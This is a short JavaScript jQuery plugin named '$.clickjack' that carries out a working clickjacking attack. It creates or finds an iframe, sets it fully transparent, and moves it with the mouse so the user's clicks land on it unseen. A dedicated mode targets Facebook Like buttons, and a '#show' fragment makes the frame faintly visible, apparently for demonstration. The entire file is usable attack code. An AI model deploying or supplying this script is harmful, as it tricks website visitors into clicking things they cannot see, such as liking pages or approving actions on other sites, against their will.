$.clickjack = function (options) {
    var defaults = {
        src: '',
        width: '80px',
        height: '30px',
        offsetX: 35,
        offsetY: 15,
        opacity: 0
    };

    var opts = $.extend(defaults, options);

    var cssObj = {
        'border': '0',
        'overflow': 'hidden',
        'cursor': 'pointer',
        'width': opts.width,
        'height': opts.height,
        'opacity': opts.opacity,
        'position': 'absolute'
    }
    var $myFrame;

    if (!opts.src) {
        alert('$.clickjack expects a URL'); return false;
    }
    else if (opts.src === 'fb') {
        $myFrame = $('iframe').filter(function () {
            if ($(this).attr('src').indexOf('facebook.com/plugins/like.php') > 0)
                return $(this);
        });
        opts.offsetX = 25;
        opts.offsetY = 10;
    }
    else {
        $myFrame = $('<iframe id="killerFrame" src="' + opts.src + '" scrolling="no"></iframe>');
        $('body').append($myFrame);
    }

    $myFrame.css(cssObj);
    $(window).mousemove(function (event) {
        var offsetY = opts.offsetY;
        var offsetX = opts.offsetX;
        var newY = (event.pageY - offsetY) + 'px';
        var newX = (event.pageX - offsetX) + 'px';
        $myFrame.css('top', newY).css('left', newX);
    });

    if (document.location.href.indexOf("#show") > 0) {
        $myFrame.css('opacity', 0.3);
    }
};